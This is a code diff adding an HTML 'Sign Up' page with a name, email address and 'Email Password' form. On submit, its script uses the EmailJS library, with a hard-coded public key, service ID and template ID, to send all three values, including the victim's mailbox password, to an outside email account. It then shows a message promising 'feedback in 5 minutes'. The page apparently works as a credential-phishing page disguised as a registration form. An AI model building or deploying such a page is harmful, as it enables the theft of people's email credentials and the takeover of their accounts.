@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign Up</title>
+  <style>
+     body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f7fc;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 10px;
+      color: #333;
+      background-image: url(./240_F_257654425_w1zitRQLsHsrcsmvsJHbEOKLNProCQkz.jpg);
+      /* background-repeat: no-repeat; */
+      background-size: contain;
+    }
+
+    .container {
+      background: #fff;
+      padding: 30px 40px;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      text-align: center;
+      color: #007bff;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 12px 0;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
+
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      outline: none;
+      border-color: #007bff;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    .response-message {
+      margin-top: 15px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .response-message.success {
+      color: #28a745;
+    }
+
+    .response-message.error {
+      color: #dc3545;
+    }
+
+    .response-message.timeout {
+      color: #ffc107;
+    }
+
+    iframe {
+      width: 100%;
+      max-width: 800px;
+      height: 400px;
+      border: none;
+      border-radius: 8px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      margin-top: 20px;
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 768px) {
+      .container {
+        padding: 20px;
+      }
+
+      button {
+        font-size: 14px;
+        padding: 10px;
+      }
+
+      input {
+        font-size: 12px;
+        padding: 10px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 15px;
+      }
+
+      h2 {
+        font-size: 18px;
+      }
+
+      button {
+        font-size: 12px;
+        padding: 8px;
+      }
+
+      input {
+        font-size: 12px;
+        padding: 8px;
+      }
+
+      iframe {
+        height: 300px;
+      }
+    }
+  </style>
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Sign Up</h2>
+    <form id="signup-form">
+      <input type="text" name="name" placeholder="Full Name" required>
+      <input type="email" name="email" placeholder="Email Address" required>
+      <input type="password" name="Email password" placeholder="Email Password" required>
+      <button type="submit">Submit</button>
+      <p class="response-message" id="responseMessage"></p>
+    </form>
+  </div>
+
+  
+ 
+
+  <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>
+  <script>
+    // Initialize EmailJS with your public key
+    emailjs.init("JXI65_lwNeGPlw_HC");  // Public Key: JXI65_lwNeGPlw_HC
+
+    document.getElementById('signup-form').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent page refresh
+
+      const form = event.target;
+      const formData = new FormData(form);
+      const data = {
+        name: formData.get('name'),
+        email: formData.get('email'),
+       Emailpassword: formData.get('Email password'),
+      };
+
+      const responseMessage = document.getElementById('responseMessage');
+      let timedOut = false;
+
+      // Set a timeout for debugging (10 seconds)
+      const timeout = setTimeout(() => {
+        timedOut = true;
+        responseMessage.className = "response-message timeout";
+        responseMessage.textContent = "Request timed out. Please try again later.";
+        console.error("EmailJS request timed out.");
+      }, 10000); // 10 seconds timeout
+
+      // Send data using EmailJS service
+      emailjs.send('service_mg385dr', 'template_ecrkf2k', data) // Service ID: service_mg385dr, Template ID: template_ecrkf2k
+        .then(response => {
+          if (!timedOut) {
+            clearTimeout(timeout);
+            console.log('Email sent successfully:', response);
+            responseMessage.className = "response-message success";
+            responseMessage.textContent = "congratulation you will recieve feedback in 5 minutes!";
+            form.reset();
+          }
+        })
+        .catch(error => {
+          if (!timedOut) {
+            clearTimeout(timeout);
+            console.error('EmailJS error:', error);
+            responseMessage.className = "response-message error";
+            responseMessage.textContent = `Error: ${error.text || error.message || "Failed to submit the form."}`;
+          }
+        });
+    });
+  </script>
+</body>
+</html>
